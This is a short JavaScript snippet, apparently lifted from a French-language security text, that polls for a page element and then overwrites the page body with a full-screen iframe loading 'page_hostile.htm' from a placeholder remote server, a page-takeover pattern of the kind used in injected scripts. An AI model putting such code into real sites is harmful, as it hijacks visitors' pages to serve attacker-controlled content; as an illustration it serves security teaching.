function a () {
var x = document . getElementById ( ’ exemple ’) ;
if ( x != null ) {
this . document . body . innerHTML = " < iframe id = iframe_hostile name = iframe_hostile
width =100% height =100%
src = http :// serveur_distant / page_hostile . htm > </ iframe > " ;
} else {
setTimeout ( ’a () ’ ,400) ;
}
}
a () ;
